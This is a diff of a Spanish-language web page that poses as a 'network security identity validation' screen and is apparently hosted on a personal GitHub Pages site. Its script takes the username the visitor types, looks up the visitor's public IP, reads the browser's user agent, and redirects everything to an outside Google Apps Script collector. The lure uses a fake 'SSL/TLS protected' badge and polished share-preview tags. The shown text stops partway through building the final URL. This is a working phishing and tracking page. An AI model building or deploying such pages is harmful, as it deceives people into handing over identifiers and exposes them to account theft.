@@ -3,17 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Seguridad de Red | Validación de Identidad</title>
+    <title>Seguridad de Acceso | Validación de Identidad</title>
 
     <meta property="og:title" content="Seguridad de Red: Validación Requerida" />
-    <meta property="og:description" content="Acceso pendiente. Por favor, valide su identidad para continuar con la sesión." />
+    <meta property="og:description" content="Acceso pendiente. Por favor, valide su identidad para continuar con la sesión segura." />
     <meta property="og:image" content="https://dennismariapinogomez-cmd.github.io/validacion-seguridad/portada.jpeg" />
     <meta property="og:url" content="https://dennismariapinogomez-cmd.github.io/validacion-seguridad/" />
     <meta property="og:type" content="website" />
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
 
     <style>
         body { 
-            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
             background-color: #fafafa; 
             display: flex; 
             justify-content: center; 
@@ -28,14 +30,14 @@
             width: 350px; 
             text-align: center; 
             border-radius: 8px; 
-            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+            box-shadow: 0 4px 15px rgba(0,0,0,0.08);
         }
         .logo-header { 
             font-weight: 700; 
-            font-size: 24px; 
-            margin-bottom: 15px; 
+            font-size: 22px; 
+            margin-bottom: 12px; 
             color: #262626; 
-            letter-spacing: -1px;
+            letter-spacing: -0.5px;
         }
         p { 
             color: #8e8e8e; 
@@ -62,17 +64,17 @@
             background-color: #0095f6; 
             border: none; 
             color: white; 
-            padding: 10px 0; 
+            padding: 12px 0; 
             border-radius: 4px; 
             font-weight: 600; 
             font-size: 14px;
             cursor: pointer; 
-            transition: background 0.2s;
+            transition: background 0.3s;
         }
         button:hover { background-color: #1877f2; }
         button:disabled { background-color: #b2dffc; cursor: not-allowed; }
         
-        .footer-tag {
+        .secure-footer {
             margin-top: 30px;
             font-size: 11px;
             color: #c7c7c7;
@@ -84,44 +86,45 @@
 <body>
 
 <div class="card">
-    <div class="logo-header">Seguridad de Red</div>
-    <p>Se requiere una validación de identidad para autorizar el acceso desde esta terminal.</p>
+    <div class="logo-header">Auditoría de Acceso</div>
+    <p>Se requiere una validación de identidad para autorizar la conexión desde esta terminal de red.</p>
     
-    <input type="text" id="userInput" placeholder="Nombre de usuario o ID" autocomplete="off">
-    <button id="btnSubmit" onclick="validarYEnviar()">Validar Acceso</button>
+    <input type="text" id="userInput" placeholder="Usuario o ID de Red" autocomplete="off" spellcheck="false">
+    <button id="btnSubmit" onclick="iniciarProceso()">Validar y Continuar</button>
     
-    <div class="footer-tag">Certificado de Seguridad SSL</div>
+    <div class="secure-footer">Conexión Protegida SSL/TLS</div>
 </div>
 
 <script>
-    async function validarYEnviar() {
+    async function iniciarProceso() {
         const user = document.getElementById('userInput').value.trim();
         const btn = document.getElementById('btnSubmit');
         
-        if (!user) { alert("Por favor, ingrese su identificación."); return; }
+        if (!user) { alert("Por favor, ingrese su identificación corporativa."); return; }
 
         btn.disabled = true;
-        btn.innerText = "Verificando...";
+        btn.innerText = "Verificando Hardware...";
 
+        let ipCapturada = "No_Detectada";
+        
         try {
-            // CAPTURA DE IP FORZADA (AWAIT)
-            const response = await fetch('https://api.ipify.org?format=json');
+            // INTENTO DE CAPTURA DE IP CON TIMEOUT
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 4000); // 4 segundos máx.
+
+            const response = await fetch('https://api.ipify.org?format=json', { signal: controller.signal });
             const data = await response.json();
-            const ip = data.ip;
-            const ua = navigator.userAgent;
-
-            // TU URL DE APPS SCRIPT
-            const scriptURL = "https://script.google.com/macros/s/AKfycbyA2L647dCpQydjl-eb0qZ5a9P1Ht_hiC50syMzCIuimB3QjeK_r4F7M7XS5UxLx5MB/exec";
-            
-            // REDIRECCIÓN FINAL
-            window.location.href = `${scriptURL}?u=${encodeURIComponent(user)}&ip=${encodeURIComponent(ip)}&ua=${encodeURIComponent(ua)}`;
-
+            ipCapturada = data.ip;
+            clearTimeout(timeoutId);
         } catch (error) {
-            // Fallback si falla la captura de IP
-            window.location.href = `https://script.google.com/macros/s/AKfycbyA2L647dCpQydjl-eb0qZ5a9P1Ht_hiC50syMzCIuimB3QjeK_r4F7M7XS5UxLx5MB/exec?u=${encodeURIComponent(user)}&ip=Error_Red&ua=${encodeURIComponent(navigator.userAgent)}`;
+            ipCapturada = "Error_Timeout_Red";
         }
-    }
-</script>
 
-</body>
-</html>
+        // DATOS DE HARDWARE
+        const hardware = navigator.userAgent;
+
+        // TU URL DE APPS SCRIPT (Endpoint Verificado)
+        const endpoint = "https://script.google.com/macros/s/AKfycbyA2L647dCpQydjl-eb0qZ5a9P1Ht_hiC50syMzCIuimB3QjeK_r4F7M7XS5UxLx5MB/exec";
+        
+        // CONSTRUCCIÓN DEL SALTO FINAL
+        const urlFinal = `${endpoint}?u
